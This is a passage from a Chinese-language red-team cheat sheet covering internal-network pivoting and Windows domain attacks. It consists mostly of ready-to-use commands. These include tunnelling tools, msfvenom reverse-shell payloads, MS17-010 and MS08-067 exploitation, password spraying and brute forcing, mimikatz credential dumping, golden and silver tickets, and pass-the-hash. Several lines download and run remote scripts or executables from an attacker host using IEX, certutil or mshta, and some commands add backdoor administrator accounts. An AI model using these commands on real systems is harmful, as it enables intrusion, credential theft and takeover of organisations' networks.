AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
ClientAliveInterval 修改为30-60保持连接
ClientAliveCountMax 取消注释 发送请求没响应自动断开次数
107是外网攻击机
内网靶机执行：
>ssh -p 22 -qngfNTR 12138:127.0.0.1:22 root@192.168.0.107
```

![image](http://159.75.51.84:8000/img/328.png)

```
攻击机执行
>ssh -p 12138 -qngfNTD 12345 root@192.168.0.107
```

![image](http://159.75.51.84:8000/img/329.png)

```
隧道建立，可使用代理软件配置攻击机外网IP:12345访问内网
```

![image](http://159.75.51.84:8000/img/330.png)

##### SSH隧道+RC4双重加密  sshrc4)

```
生成木马
>msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=123456 lport=446 -f exe -o /var/www/html/bind.exe
MSF设置
>setg proxies socks5:0.0.0.0:12138
>use exploit/multi/handler
>set payload windows/x64/meterpreter/bind_tcp_rc4
>set rc4password 123456
>set rhost 10.1.1.97
>set lport 446
```

![image](http://159.75.51.84:8000/img/331.png)

##### 公网SSH隧道+LOCAL MSF  sshlocal-msf)

```
>msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=公网IP LPORT=12138 -f exe –o /var/www/html/1.exe
Handler监听本地IP:12138
SSH转发
>ssh -N -R 12138:本地内网IP:12138 root@公网IP
```

#### socks4a  socks4a)

```
#use auxiliary/server/socks4a
#set srvhost 0.0.0.0
#set srvport 1080
#run
多层网络
再多配置个端口
Win: Proxifier& Sockscap64
Linux: proxychains& 浏览器
&
meterpreter > ipconfig 
IP Address : 10.1.13.3 
meterpreter > run autoroute -s 10.1.13.0/24 
meterpreter > run autoroute -p 
10.1.13.0 255.255.255.0 Session 1 
meterpreter > bg 
msf auxiliary(tcp) > use exploit/windows/smb/psexec 
msf exploit(psexec) > set RHOST 10.1.13.2 
msf exploit(psexec) > exploit
```

#### socks5  socks5)

```
#use auxiliary/server/socks5
#set srvhost 0.0.0.0
#set srvport 1080
#run
浏览器
```

#### 基于web的socks5  websocks5)

##### REGEORG  regeorg)

```
https://github.com/sensepost/reGeorg
>python reGeorgSocksProxy.py -u http://靶机/tunnel.aspx -l 外网IP -p 10080
打开Proxifier，更改为脚本指定的端口10080
```

![image](http://159.75.51.84:8000/img/332.png)

```
或proxychains
#vim /etc/proxychains.conf
去掉dynamic_chain注释>添加socks5 127.0.0.1 10080
```

![image](http://159.75.51.84:8000/img/333.png)

```
或MSF
>setg proxies socks5:外网IP:10080
>setg ReverseAllowProxy true 允许反向代理
```

![image](http://159.75.51.84:8000/img/334.png)

##### NEO-REGEORG  neo-regeorg)

```
Step 1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器
$ python3 neoreg.py generate -k password
```

![image](http://159.75.51.84:8000/img/335.png)

```
伪装页面
$ python3 neoreg.py generate -k <you_password> --file 404.html
Step 2. 使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理
$ python3 neoreg.py -k password -u http://xx/tunnel.php
$ python3 neoreg.py -k <you_password> -u <server_url> --skip
开启代理
$ python neoreg.py -k <you_password> -l 外网IP -p 10081 -u http://xx/neo-tunnel.aspx
```

![image](http://159.75.51.84:8000/img/336.png) ![image](http://159.75.51.84:8000/img/337.png)

##### ABPTTS端口转发  abptts)

```
https://github.com/nccgroup/ABPTTS
端口转发
>python abpttsfactory.py -o webshell 生成shell
./webshell目录下生成的相应脚本文件传入目标中
>python abpttsclient.py -c webshell/config.txt -u "http://目标网址/trans.aspx" -f 攻击机IP:12345/目标IP:3389
```

![image](http://159.75.51.84:8000/img/338.png) ![image](http://159.75.51.84:8000/img/339.png) ![image](http://159.75.51.84:8000/img/340.png)

```
ABPTTS转发内网其他机器端口
>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389
```

![image](http://159.75.51.84:8000/img/341.png) ![image](http://159.75.51.84:8000/img/342.png)

```
要转发多个机器或多个端口
>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389 -f 192.168.0.107:33891/10.1.1.101:80 -f 192.168.0.107:33892/10.1.1.102:22
SSH代理一级网段
需要一台有权限的Linux靶机
>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.108:22
>ssh -p 222 -qTfnN -D 0.0.0.0:1081 root@192.168.0.107
```

![image](http://159.75.51.84:8000/img/343.png)

```
配置proxychains即可
```

![image](http://159.75.51.84:8000/img/344.png)

```
SSH代理二级网段
需要靶机web权限，一级内网一台web权限
转发内网web出来传入abptts的shell
>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:8080/10.1.1.108:80 
>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.107/qq.aspx -f 192.168.0.107:222/10.1.1.106:22
SSH连接192.168.0.107:222即可到达二级网络
反弹msf
kali生成bind型脚本
>msfvenom -p linux/x64/shell_bind_tcp LPORT=12138 -f elf -o shell
在二级不出网linux上执行
将他的12138端口通过abptts转出
>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:13128/10.1.1.101:12138
Msf本地监听13128即可
```

##### TUNNA转发  tunna)

```
>python proxy.py -u http://192.168.0.98/tunnel.aspx -l 12138 -r 3389 –v
```

![image](http://159.75.51.84:8000/img/345.png)

#### Earthworm  earthworm)

![image](http://159.75.51.84:8000/img/346.png)

##### 正向(目标机存在外网IP)：  ip)

```
>ew –s ssocksd –l 888
连接sockscap64靶机外网IP+端口888
```

##### 反弹SOCKS5(目标机无外网IP)：  socks5ip)

```
外网攻击机：
>ew -s rcsocks -l 1008 -e 888
-l为socks软件连接的端口，-e为目标主机和vps的通信端口。
靶机:
>ew -s rssocks -d 外网IP -e 1008 
sockscap64连接攻击机外网IP+端口1008
```

##### 二级环境(A有外网，B内网无外网)：  ab)

```
靶机B:
>ew –s ssocksd –l 888
靶机A:
>ew –s lcx_tran –l 1080 –f 靶机B –g 888
Sockscap64连接靶机外网IP+端口 1080
```

##### 二级环境(A无外网，B内网无外网)：  ab_1)

```
外网攻击机：
>ew –s lcx_listen –l 10800 –e 888
靶机B：
>ew –s ssocksd –l 999
靶机A:
>ew -s lcx_slave -d 外网 -e 8888 -f 靶机B -g 9999 
Sockscap64连接攻击机外网IP+端口 10080
```

##### 三级环境(A无外网,B内网无外网通A,C通B)：  abacb)

```
外网攻击机：
>ew -s rcsocks -l 1008 -e 888
靶机A：
>ew -s lcx_slave -d 外网攻击机 -e 888 -f 靶机B -g 999
靶机B：
>ew -s lcx_listen -l 999 -e 777
靶机C:
>ew -s rssocks -d靶机B -e 777
Sockscap64连接攻击机外网IP+端口 1008
```

#### Frp  frp)

```
https://github.com/fatedier/frp/releases/
使用条件:目标主机通外网，拥有自己的公网ip
对攻击机外网服务端frps.ini进行配置
[common]
bind_port=8080
靶机客户端
[common]
server_addr=服务器端外网IP
server_port=8080
[socks5]
type=tcp
remote_port=12345
plugin=socks5
use_encryption=true
use_compression=true
以上是启用加密和压缩，能躲避流量分析设备。
上传frpc.exe和frpc.ini到目标服务器上,直接运行frpc.exe（在实战中可能会提示找不到配置文件，需要使用-c参数指定配置文件的路径frpc.exe -c 文件路径），可以修改文件名和配置名以混淆视听。
公网vps主机上运行./frps –c frps.ini
靶机执行./frpc –c frpc.ini
```

![image](http://159.75.51.84:8000/img/347.png)

```
MSF中设置全局变量
>setg proxies 公网IP:12345
>setg ReverseAllowProxy true 运行反向代理
```

![image](http://159.75.51.84:8000/img/348.png) ![image](http://159.75.51.84:8000/img/349.png)

```
结束攻击
tasklist 
taskkill /pid 进程号 -t –f
```

#### SSF  ssf_1)

```
https://github.com/securesocketfunneling/ssf/releases
```

##### 正向SOCKS代理  socks)

```
边界机器执行：
>ssfd.exe -p 1080 linux执行：./ssfd -p 1080
```

![image](http://159.75.51.84:8000/img/350.png)

```
攻击机执行：
>ssf.exe -D 12138 -p 1080 192.168.0.98(边界机器IP)
```

![image](http://159.75.51.84:8000/img/351.png)

```
本机配置proxychain或proxifier
```

![image](http://159.75.51.84:8000/img/352.png)

##### 反向SOCKS代理  socks_1)

```
攻击机执行：
>ssfd.exe -p 1080
```

![image](http://159.75.51.84:8000/img/353.png)

```
内网机器执行：
>ssf.exe -F 12138 -p 1080 192.168.0.106(攻击机IP)
```

![image](http://159.75.51.84:8000/img/354.png) ![image](http://159.75.51.84:8000/img/355.png)

##### 多级级联  _94)

```
多级内网机执行：
>ssfd.exe -p 1080 -c config.json
Json文件加入字段
"circuit": [ 
{"host": "A中继机IP", "port":"1080"}, 
{"host": "B中继机IP", "port":"1080"} 
],
所有中继机执行：
>ssfd.exe -p 1080 -c config.json
边界机器执行：
>ssf.exe -c config.json -p 1080 多级内网机IP -X 12138
边界机执行：
>nc.exe 127.0.0.1 12138即可获得多级内网机cmdshell
```

##### 反弹SHELL  shell_1)

```
攻击机执行：
>ssfd.exe -p 1080 -c config.json
```

![image](http://159.75.51.84:8000/img/356.png)

```
内网机器执行：
```

![image](http://159.75.51.84:8000/img/357.png)

```
攻击机执行：
>nc 127.0.0.1 12138
```

![image](http://159.75.51.84:8000/img/358.png)

#### Shadowsocks  shadowsocks)

```
https://github.com/shadowsocks/libQtShadowsocks/releases/download/v2.0.2/shadowsocks-libqss-v2.0.2-win64.7z
靶机新建配置文件1.json，内容为
{
"server":"0.0.0.0",
"server_port":13337,
"local_address":"127.0.0.1",
"local_port":1080,
"password":"123456",
"timeout":300,
"method":"aes-256-cfb",
"fast_open":false,
"workers": 1
}
执行
>shadowsocks-libqss.exe -c 1.json –S
攻击机配置
```

![image](http://159.75.51.84:8000/img/359.png)

```
浏览器或其他攻击软件配置代理127.0.0.1:1080即可(需有http(s)/socks5功能)
```

![image](http://159.75.51.84:8000/img/360.png) ![image](http://159.75.51.84:8000/img/361.png)

#### Goproxy  goproxy)

```
https://github.com/snail007/goproxy/releases
靶机执行
>proxy.exe socks -t tcp -p "0.0.0.0:13337"
```

![image](http://159.75.51.84:8000/img/362.png)

```
攻击机配置Proxifier
```

![image](http://159.75.51.84:8000/img/363.png)

#### Chisel  chisel_1)

```
https://github.com/jpillora/chisel/releases
攻击机监听
>chisel.exe server -p 12138 --reverse
```

![image](http://159.75.51.84:8000/img/364.png)

```
靶机执行
>chisel.exe client 192.168.0.102:12138 R:12345:127.0.0.1:12346
```

![image](http://159.75.51.84:8000/img/365.png)

```
靶机执行
>chisel.exe server -p 12346 --socks5
```

![image](http://159.75.51.84:8000/img/366.png)

```
攻击机执行
>chisel.exe client 127.0.0.1:12345 socks
```

![image](http://159.75.51.84:8000/img/367.png)

```
当隧道建立成功时，攻击机本地会启动1080端口
```

![image](http://159.75.51.84:8000/img/368.png)

```
即可使用
```

#### 代理软件  _95)

```
Sockscap64
Proxifier 
Proxychains
#vim /etc/proxychains.conf
去掉dynamic_chain注释>添加socks4 127.0.0.1 1080
#cp /usr/lib/proxychains3/proxyresolv /usr/bin
```

### Ngrok内网穿透  ngrok)

```
https://ngrok.com/
https://www.ngrok.cc/
下载ngrok
#ngrok authtoken 授权码
#ngrok http 8080
#ngrok tcp 8888
```

### MS17-010  ms17-010)

```
扫描
#use auxiliary/scanner/smb/smb_ms17_010
#set rhosts 192.168.1.0/24
&
#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms17-010.nse 10.11.1.0/20
攻击
#use exploit/windows/smb/ms_17_010_eternalblue易蓝屏
#set payload windows/x64/meterpreter/reverse_tcp
#use auxiliary/admin/smb/ms17_010_command
#set command REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f
```

### MS08_067  ms08_067)

```
#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms08-067.nse 10.11.1.0/20
#use exploit/windows/smb/ms08_067_netapi
#set payload windows/meterpreter/reverse_tcp
CVE-2019-0708
```

### 攻击MySQL数据库  mysql)

```
#use auxiliary/scanner/mysql/mysql_version 主机发现
#use auxiliary/scanner/mysql/mysql_login MYSQL爆破
#use exploit/multi/mysql/mysql_udf_payload UDF提权
#use exploit/windows/mysql/mysql_mof MOF提权
#use auxiliary/admin/mysql/mysql_sql 执行命令
```

### 攻击MSSQL数据库  mssql_1)

```
>PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()" 列出域内mssql主机
https://github.com/NetSPI/PowerUpSQL
>Get-SQLInstanceLocal          #发现本机SQLServer实例
>Get-SQLInstanceDomain         #发现域中的SQLServer实例
>Get-SQLInstanceBroadcast      #发现工作组SQLServer实例
>$Targets = Get-SQLInstanceBroadcast -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object {$_.Status -like "Accessible"} 工作组mssql爆破
>$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object {$_.Status -like "Accessible"} 
>Get-SQLInstanceBroadcast -Verbose | Get-SQLServerLoginDefaultPw –Verbose
>$Targets 域内MSSQL爆破
Nishang脚本爆破MSSQL
>Invoke-BruteForce -ComputerName dc.zone.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose -StopOnSuccess
#use auxiliary/scanner/mssql/mssql_login 爆破主机
#use auxiliary/admin/mssql/mssql_exec 调用cmd
#use auxiliary/admin/mssql/mssql_sql 执行SQL语句
#use exploit/windows/mssql/mssql_payload 上线MSSQL主机
http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1
导入nishang执行MSSQL命令的脚本
>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1')
>Execute-Command-MSSQL -ComputerName 192.168.0.98 -UserName sa -Password admin 会返回powershell
#use auxiliary/scanner/mssql/mssql_hashdump 导出MSSQL密码
已知服务器ntlmhash，未知mssql账号密码
Hash注入+socks无密码连接mssql
>mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:. /ntlm:{hash} /run:\"C:\*\SocksCap64\SocksCap64_RunAsAdmin.exe\"" "exit"
将SSMS.exe加入sockscap中启动
命令行版sqltool
https://github.com/uknowsec/SharpSQLTools
```

### 隔离主机payload  payload_1)

```
隔离主机一般与攻击机无双向路由，payload设置为bind让靶机监听。
>set payload windows/meterpreter/bind_tcp
>set RHOST 隔离机IP
```

![image](http://159.75.51.84:8000/img/369.png)

### 爆破  _96)

#### Hydra  hydra)

```
参数：
-l 指定的用户名 -p 指定密码
-L 用户名字典  -P 密码字典
-s 指定端口 -o 输出文件
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
>hydra -L /root/user.txt -P pass.txt smb 10.1.1.10 -vV
>hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
```

#### Medusa  medusa)

```
参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
>medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
>medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```

#### 域内爆破  _97)

##### KERBRUTE  kerbrute)

```
https://github.com/ropnop/kerbrute
用户枚举
>kerbrute_windows_amd64.exe userenum -d zone.com username.txt
```

![image](http://159.75.51.84:8000/img/371.png) 密码喷射 >kerbrute_windows_amd64.exe passwordspray -d zone.com use.txt password ![image](http://159.75.51.84:8000/img/372.png)

```
密码爆破
此项会产生日志
>kerbrute_windows_amd64.exe bruteuser -d zone.com pass.txt name
```

![image](http://159.75.51.84:8000/img/373.png)

```
组合爆破
格式为username:password
>kerbrute_windows_amd64.exe -d zone.com bruteforce com.txt
```

##### DOMAINPASSWORDSPRAY  domainpasswordspray)

```
https://github.com/dafthack/DomainPasswordSpray
自动收集账户进行密码喷射
>Invoke-DomainPasswordSpray -Password pass
```

![image](http://159.75.51.84:8000/img/374.png)

```
组合爆破
>Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -PasswordList passlist.txt -OutFile result.txt
会产生日志
单密码
>Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -Password password
```

### 方程式内网不产生session  session)

```
msfvenom生成一个x64或x86的dll文件，替换该工具下的x64.dll或x86.dll
windows server 2008 ，msfvenom生成x64.dll文件
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll > x64.dll
msf配置
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lport 12345
set lhost 192.168.0.107
将该x64.dll替换到方程式利用工具下面。
只需要更换目标的IP，就可以获取session。
windows server 2003 ，msfvenom生成x86.dll文件
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll > x86.dll
msf配置
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set lport 12345
set lhost 192.168.0.107
通过ms17_010_commend模块执行系统命令添加用户至管理员。再指定SMBPass和SMBUser来建立windows可访问命名管道
```

### Kerberoasting  kerberoasting)

```
https://github.com/nidem/kerberoast
```

#### SPN发现  spn)

##### CMD  cmd_3)

```
>setspn -T 域名 -Q */*
```

![image](http://159.75.51.84:8000/img/375.png)

##### POWERSHELL  powershell_5)

https://github.com/PyroTek3/PowerShell-AD-Recon ![image](http://159.75.51.84:8000/img/376.png)

```
Powerview
>Get-NetComputer -SPN termsrv*
>Get-NetUser -SPN
```

![image](http://159.75.51.84:8000/img/377.png)

```
>import module GetUserSPNs.ps1
```

##### EMPIRE  empire_4)

```
>usemodule situational_awareness/network/get_spn
```

#### 申请票据  _98)

```
>Add-Type -AssemblyName System.IdentityModel
>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"
&
>kerberos::ask /target:SPN
```

#### 导出票据  _99)

```
mimikatz>kerberos::list /export
```

#### 破解密码  _100)

```
>python tgsrepcrack.py word.txt file.kirbi
https://github.com/leechristensen/tgscrack
>python extractServiceTicketParts.py file.kirbi
>tgscrack.exe -hashfile hash.txt -wordlist word.txt
```

#### 重写票据  _101)

```
>python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -u 500
>python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -g 512
注入内存、
>kerberos::ptt new.kirbi
```

#### GetUserSPNs  getuserspns)

```
https://github.com/SecureAuthCorp/impacket
请求TGS
>python GetUserSPNs.py -request -dc-ip 10.1.1.1 zone.com/y
破解
>hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
```

### ASEPRoasting  aseproasting)

```
当用户关闭了kerberos预身份认证时可以进行攻击
```

![image](http://159.75.51.84:8000/img/378.png)

```
>Rubeus.exe asreproast /user:y /dc:10.1.1.100 /domain:zone.com
```

![image](http://159.75.51.84:8000/img/379.png)

```
或使用Powerview结合https://github.com/gold1029/ASREPRoast
获取不要求kerberos预身份验证的域内用户
>Get-DomainUser -PreauthNotRequired -Properties distinguishedname –Verbose
```

![image](http://159.75.51.84:8000/img/380.png)

```
>Get-ASREPHash -UserName y -Domain zone.com -Verbose
```

![image](http://159.75.51.84:8000/img/381.png)

```
破解RC4-HMAC AS-REP
>john hash.txt --wordlist=wordlist.txt
```

![image](http://159.75.51.84:8000/img/382.png)

### PASS-THE-HASH  pass-the-hash)

```
允许本地管理组所有成员连接
>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

#### WMIExec & TheHash  wmiexec-thehash)

```
>powershell -ep bypass
>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-TheHash/Invoke-WMIExec.ps1'); 
>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-TheHash/Invoke-TheHash.ps1');
>Invoke-TheHash -Type WMIExec -Target 192.168.0.0/24 -Domain zone.com -Username godadmin -Hash f1axxxxxxxxxb771
```

![image](http://159.75.51.84:8000/img/383.png)

#### WMI  wmi_2)

```
>net use \\1.1.1.1\admin$ /user:"administrator" "password"
>copy windowsupdate.exe \\1.1.1.1\admin$\dir\
>wmic /NODE:"1.1.1.1" /user:"administrator" /password:"password" PROCESS call create "c:\windows\dir\windowsupdate.exe" 
>del \\1.1.1.1\admin$\dir\windowsupdate.exe /F 
>net use \\1.1.1.1\admin$ /del
```

##### WMIEXEC.PY  wmiexecpy)

```
https://github.com/SecureAuthCorp/impacket 
>python wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 域名/Administrator@192.168.11.1 "whoami"
>python wmiexec.py admin@192.168.1.2
```

![image](http://159.75.51.84:8000/img/384.png)

##### WMIEXEC.VBS  wmiexecvbs)

```
半交互式：
>cscript //nologo wmiexec.vbs /shell 192.168.1.2 admin pass
单条命令
>cscript //nologo wmiexec.vbs /cmd 192.168.1.2 domain\admin pass "whoami"
下载执行
>wmic /node:192.168.0.115 /user:godadmin /password:password PROCESS call create "cmd /c certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe c:/windows/temp/win.exe & c:/windows/temp/win.exe & certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe delete"
```

![image](http://159.75.51.84:8000/img/385.png)

##### POWERSHELL  powershell_6)

```
>wmic /NODE:192.168.3.108 /user:"godadmin" /password:"password" PROCESS call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/xxx.txt');\""
Invoke-WMIExec
>powershell -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-WMIExec.ps1');Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1a5b1a3641bec99ff92fe9df700b771 -Command \"net user admin Qwe@123 /add\" -Verbose"
```

![image](http://159.75.51.84:8000/img/386.png)

```
>powershell -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-WMIExec.ps1');Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1xxxxxxxxxxxxx771 -Command \"mshta http://192.168.0.107:8080/YAyAPN6odzbAzKn.hta\" -Verbose"
```

![image](http://159.75.51.84:8000/img/387.png)

#### Psexec  psexec)

```
>psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09域名/Administrator@192.168.1.1 "whoami"
>psexec.exe –accepteula \\192.168.1.2 –u admin –p pass cmd.exe 无确认窗
Msf
#use exploit/windows/smb/psexec
#use exploit/windows/smb/psexec_psh(powershell版本)
```

#### Mimikatz  mimikatz_3)

```
Windows XP、Vista、2008、7、2008 r2 和2012没有安装KB2871997补丁的机器上，使用NTLM进行PTH
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:{ntlm}
执行一个文件
mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:{ntlm} /run:powershell.exe
Windows 8.1 、2012 R2、安装KB2871997的Win 7 、2008 R2和2012上可使用AES KEY进行PTH
>privilege::debug
>sekurlsa::ekeys
>sekurlsa::pth /user:administrator /domain:zone.com /aes128:{key}
```

#### pth-winexe  pth-winexe)

```
>pth-winexe -U godadmin%password --system --ostype=1 //192.168.0.115 cmd
```

![image](http://159.75.51.84:8000/img/388.png)

#### Smbexec  smbexec)

```
>python smbexec.py administrator@192.168.0.98
```

![image](http://159.75.51.84:8000/img/389.png)

### PASS-THE-TICKET  pass-the-ticket)

#### 名词  _102)

```
KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS
AS(Authentication Server)： 身份认证服务
TGS(Ticket Granting Server)： 票据授予服务
TGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时
```

#### 黄金票据+Mimikatz  mimikatz_4)

```
Golden Ticket伪造TGT(Ticket Granting Ticket)，可以获取任何Kerberos服务权限，
域控中提取krbtgt的hash
域控：dc.zone.com
域内机器：sub2k8.zone.com
域内普通用户：y
域内机器是不能访问dc上的文件
```

![image](http://159.75.51.84:8000/img/390.png)

```
清空票据
```

![image](http://159.75.51.84:8000/img/391.png)

```
域控中获取krbtgt用户的信息
>privilege::debug
>mimikatz log "lsadump::dcsync /domain:zone.com /user:krbtgt"
获取信息：/domain、/sid、/aes256
```

![image](http://159.75.51.84:8000/img/392.png)

```
在sub2k8中生成golden ticket
>mimikatz “kerberos::golden /krbtgt:{ntlmhash} /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi”
```

![image](http://159.75.51.84:8000/img/393.png)

```
导入
Mimikatz#kerberos::ptt 123.kirbi
```

![image](http://159.75.51.84:8000/img/394.png)

#### 白银票据+Mimikatz  mimikatz_5)

![image](http://159.75.51.84:8000/img/395.png)

```
Silver Ticket是伪造的TGS，只能访问指定服务权限
域控：dc.zone.com
域内机器：sub2k8.zone.com
域内普通用户：y
域控中导出
>privilege::debug
>sekurlsa::logonpasswords
```

![image](http://159.75.51.84:8000/img/396.png)

```
Sub2k8伪造票据
>mimikatz "kerberos::golden /domain:zone.com /sid:{SID} /target:dc.zone.com /service:cifs /rc4:{NTLM} /user:y /ptt"
```

![image](http://159.75.51.84:8000/img/397.png)

#### MS14-068  ms14-068)

```
https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe
域控：dc.zone.com/10.1.1.100
域内机器：sub2k8.zone.com/10.1.1.98
域内普通用户：y，
Sub2k8中清除票据
Mimikatz#kerberos::purge
>whoami /user查看SID 
创建ccache票据文件
> MS14-068.exe -u y@zone.com -p password -s S-1-5-21-2346829310-1781191092-2540298887-1112 -d dc.zone.com
注入票据
Mimikatz# Kerberos::ptc c:\xx\xx\xxx.ccache
psexec无密码登陆
>PsExec.exe \\dc.xx.com\ cmd.exe
```

#### Mimikatz+MSF  mimikatzmsf)

```
>whoami /user 查看SID
msf >use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
msf >set domain 域名
msf >set password 密码
msf >set rhost 域控机器
msf >set user 用户
msf >set user_sid sid
得到.bin文件
#apt-get install krb5-user
上传mimikatz和bin文件
Mimikatz# Kerberos::clist “xxxx.bin” /export
生成kirbi文件
Meterpreter >load kiwi
Meterpreter >download c:/wmpub/xxxxxx.kirbi /tmp/
注入票据
Meterpreter >kerberos_ticket_use /tmp/xxxxxx.kirbi
#use exploit/windows/local/current_user_psexec
#set TECHNIQUE PSH
#set RHOST dc.xx.com
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.1.1
#set session 1
#exploit
```

#### goldenPac.py  goldenpacpy)

```
kali下
#apt-get install krb5-user
#goldenPac.py –dc-ip 10.1.1.100 –target-ip 10.1.1.100 zone.com/y:password@dc.zone.com
```

### 账户委派  _103)

#### 账户非受限委派  _104)

```
设置用户y为服务账户(服务账户有委派权限)
>setspn -U -A variant/golden y
```

![image](http://159.75.51.84:8000/img/398.png)

```
查询非受限委派域内账号，使用powerview
>Get-NetUser -Unconstrained -Domain zone.com
```

![image](http://159.75.51.84:8000/img/399.png)

```
利用
管理员权限打开mimikatz导出TGT
>privilege::debug
>sekurlsa::tickets /export
```

![image](http://159.75.51.84:8000/img/400.png)

```
清空票据，导入票据
```

![image](http://159.75.51.84:8000/img/401.png) ![image](http://159.75.51.84:8000/img/402.png)

```
获得Powershell会话
> Enter-PSSession -ComputerName dc.zone.com
```

![image](http://159.75.51.84:8000/img/403.png)

#### 账户受限委派  _105)

```
查询受限委派用户
> Get-DomainUser -TrustedToAuth –Domain zone.com
```

![image](http://159.75.51.84:8000/img/404.png)

```
查询受限委派主机
> Get-DomainComputer -TrustedToAuth -Domain zone.com
```

![image](http://159.75.51.84:8000/img/405.png)

```
利用方法后见权限维持模块
```

### 资源受限委派  _106)

```
获取域管理员
>Get-DomainUser|select -First 1
域对象信息
>Get-DomainObject -Identity 'DC=zone,DC=com'
ms-ds-machineaccountquota允许非特权用户将最多 10 台计算机连接到域
```

![image](http://159.75.51.84:8000/img/406.png)

```
查看有没有设置msDS-AllowedToActOnBehalfOfOtherIdentity策略
>Get-DomainComputer dc|select name, msDS-AllowedToActOnBehalfOfOtherIdentity
```

![image](http://159.75.51.84:8000/img/407.png)

```
用powermad添加一具备SPN的机器账户
https://github.com/Kevin-Robertson/Powermad
>New-MachineAccount -MachineAccount newcom
```

![image](http://159.75.51.84:8000/img/408.png)

```
或
>$pass = ConvertTo-SecureString '123qwe!@#' -AsPlainText –Force
>New-MachineAccount –MachineAccount newcom -Password $pass
或
>New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString '123qwe!@#' -AsPlainText -Force)
```

![image](http://159.75.51.84:8000/img/409.png)

```
获取添加的机器账户的SID
```

![image](http://159.75.51.84:8000/img/410.png)

```
将添加的机器账户的SID设置给DC的msDS-AllowedToActOnBehalfOfOtherIdentity参数
